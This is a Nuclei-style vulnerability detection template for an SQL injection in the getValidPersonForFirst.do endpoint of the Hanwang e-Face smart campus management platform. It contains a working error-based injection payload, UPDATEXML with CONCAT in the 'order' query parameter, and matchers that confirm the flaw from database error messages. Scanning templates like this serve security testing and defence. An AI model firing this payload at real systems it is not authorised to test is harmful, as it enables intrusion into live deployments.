id: poc-yaml-hw-e-face-pass-spmp-getvalidpersonforfirst-do-sqli
info:
  name: 汉王e脸通智慧园区管理平台 getValidPersonForFirst.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects a SQL injection vulnerability in 汉王e脸通智慧园区管理平台's getValidPersonForFirst.do endpoint. The issue is identified based on specific error messages and responses to malicious payloads.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/manage/firstPeopleOpen/getValidPersonForFirst.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,{{t2}},0x7e,(SELECT+(ELT(123=123,1)))),8357))"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
          - "XPATH syntax error"
          - "java.sql.SQLException"
      - type: word
        part: body
        words:
          - "{{t2}}"
